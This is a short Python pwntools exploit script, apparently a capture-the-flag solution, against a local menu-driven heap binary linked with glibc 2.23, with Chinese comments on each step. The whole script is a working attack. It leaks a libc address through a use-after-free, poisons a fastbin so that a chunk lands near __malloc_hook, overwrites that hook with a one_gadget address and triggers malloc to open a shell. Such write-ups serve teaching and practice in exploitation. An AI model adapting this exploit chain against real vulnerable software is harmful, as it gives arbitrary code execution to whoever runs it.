from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc-2.23.so")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


gdb.attach(p)
# pause()

# 泄露libc地址
add_chunk(0, 0x200)
add_chunk(1, 0x20)
delete_chunk(0)
show_chunk(0)

p.recvline()
# tmp = p.recvuntil(b'\x7f')
# print(f"tmp = {tmp.hex()}")
libc.address = u64(p.recvuntil(b'\x7f').ljust(0x8, b'\x00')) - 0x39bb78
print(f"libc.address = {hex(libc.address)}")

# 使用uaf将fastbin chunk的fd指向fake chunk（overflow实现修改fd也可以）
add_chunk(2, 0x68)
delete_chunk(2)

# fake chunk起始于__malloc_hook - 0x23
edit_chunk(2, p64(libc.sym["__malloc_hook"] - 0x23))
add_chunk(0, 0x68)
add_chunk(0, 0x68) # 申请并获得fake chunk

one_gadgets = [0xd5c07, 0x3f43a, 0x3f3e6]
og = libc.address + one_gadgets[0]
# 修改fake chunk addr + 0x13 == &__malloc_hook指向的内容为one gadget
edit_chunk(0, b"a" * 0x13 + p64(og))

# 调用malloc，执行__malloc_hook，实现调用one gadget，getshell
add_chunk(0, 0x123)


p.interactive()
